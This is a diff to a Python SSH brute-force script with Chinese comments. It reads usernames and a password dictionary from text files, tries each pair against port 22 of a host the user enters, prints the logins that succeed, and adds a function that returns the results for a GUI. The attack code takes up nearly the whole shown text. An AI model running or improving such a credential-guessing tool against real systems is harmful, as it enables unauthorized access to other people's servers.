@@ -18,7 +18,6 @@ def sshbrute(user, passw, host):
         ssh.connect(hostname=host, port=22, username=user, password=passw, timeout=1)
         # 打印出成功登录的 用户名 和 密码
         print("login success! User:" + user, "Pass:" + passw)
-        work += "login success! User:" + user + "Pass:" + passw
     except:
         # 打印出 登录失败 的 用户名 和 密码
         print("login failed!", "user:" + user, "pass:" + passw + '\n', end='')
@@ -42,8 +41,14 @@ def begin():
     host = input(' 请输入需要ssh爆破的地址:')
     tempuser = open('用户名.txt', 'r')
     temppasswd = open('密码库.txt', 'r')
-    multi_ssh(tempuser, temppasswd, host)
-    print(work)
+    print(multi_ssh(tempuser, temppasswd, host))
+
+
+def GUIbegin(host):
+    tempuser = open('用户名.txt', 'r')
+    temppasswd = open('密码库.txt', 'r')
+    return multi_ssh(tempuser, temppasswd, host)
+
 
 
 work = ''
@@ -55,3 +60,5 @@ mutex = threading.Lock()
 def print(text, *args, **kw):
     with mutex:
         _print(text, *args, **kw)
+
+begin()
